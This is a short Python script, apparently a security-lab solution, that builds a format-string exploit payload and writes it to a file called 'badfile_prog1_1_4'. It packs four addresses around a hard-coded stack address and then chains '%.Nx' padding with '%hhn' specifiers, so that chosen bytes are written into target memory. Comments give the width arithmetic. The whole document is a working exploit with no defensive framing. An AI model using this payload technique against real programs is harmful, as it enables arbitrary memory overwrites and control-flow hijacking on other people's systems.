#!/usr/bin/python3
import sys

addr = 0xffffd668
payload =  (addr + 3).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr + 2).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr + 1).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4, byteorder='little')

# 34 = 0x66 - 28 - 8 * 5
# 34 = 0x88 - 0x66 
# 239 = 0x177 - 0x88
# 34 = 0x199 - 0x177
s = "%.8x" * 5 + "%.34x" + "%hhn" + "%.34x" + "%hhn" + "%.239x" + "%hhn" + "%.34x" + "%hhn"
payload += s.encode('latin-1')

with open("badfile_prog1_1_4", "wb") as f:
    f.write(payload)